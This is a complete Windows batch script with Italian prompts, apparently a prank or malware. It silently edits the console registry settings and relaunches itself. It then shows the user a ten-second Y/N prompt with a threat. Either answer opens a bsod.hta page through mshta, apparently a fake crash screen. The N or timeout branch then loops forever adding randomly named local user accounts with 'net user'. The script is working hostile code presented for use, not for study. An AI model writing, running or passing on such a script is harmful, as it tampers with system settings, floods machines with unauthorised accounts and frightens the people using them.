@echo off
if exist "%TEMP%\consoleSettingsBackup.reg" regedit /S "%TEMP%\consoleSettingsBackup.reg"&DEL /F /Q "%TEMP%\consoleSettingsBackup.reg"&goto :mainstart
regedit /S /e "%TEMP%\consoleSettingsBackup.reg" "HKEY_CURRENT_USER\Console"
echo REGEDIT4>"%TEMP%\disablequickedit.reg"
echo [HKEY_CURRENT_USER\Console]>>"%TEMP%\disablequickedit.reg"
(echo "QuickEdit"=dword:00000000)>>"%TEMP%\disablequickedit.reg"
regedit /S "%TEMP%\disablequickedit.reg"
DEL /F /Q "%TEMP%\disablequickedit.reg"
start "" "cmd" /c "%~dpnx0"&exit
:mainstart

setlocal EnableDelayedExpansion

if "%~1" equ "TimeoutMonitor" goto %1

del InputLine.txt 2> NUL
(
   set /P "input=Premere Y (Minuscolo) per continuare il divertimento o N per finire (Dopo 10 sec. di NON risposta la LUCIE eseguira' l'opzione peggiore): " > CON
   > InputLine.txt call set /P "=%%input%%" < NUL
) 2> NUL | "%~F0" TimeoutMonitor 9
set /P "input=" < InputLine.txt
del InputLine.txt
if /I "%input%" equ "y" (
   echo Wise choise, MAYBE
cd "C:\Windows\System32"
start mshta.exe "%userprofile%\AppData\Local\bsod.hta"
ping 127.0.0.1 -n 7 > nul

) else (
cd "C:\Windows\System32"
start mshta.exe "%userprofile%\AppData\Local\bsod.hta"
echo Pigliate un milione di utenti addati u.u
:useraddspammer
net user %random% /add
goto useraddspammer
)
goto :EOF

:TimeoutMonitor

rem Get the PID of pipe's left side
tasklist /FI "IMAGENAME eq cmd.exe" /FO TABLE /NH > tasklist.txt
for /F "tokens=2" %%a in (tasklist.txt) do (
   set "leftSidePipePID=!lastButOnePID!"
   set "lastButOnePID=%%a"
)
del tasklist.txt

for /L %%i in (1,1,%2) do (
   ping -n 2 localhost > NUL
   if exist InputLine.txt exit /B
)


taskkill /PID %leftSidePipePID% /F > NUL
echo/
echo Timed Out> InputLine.txt

exit /B
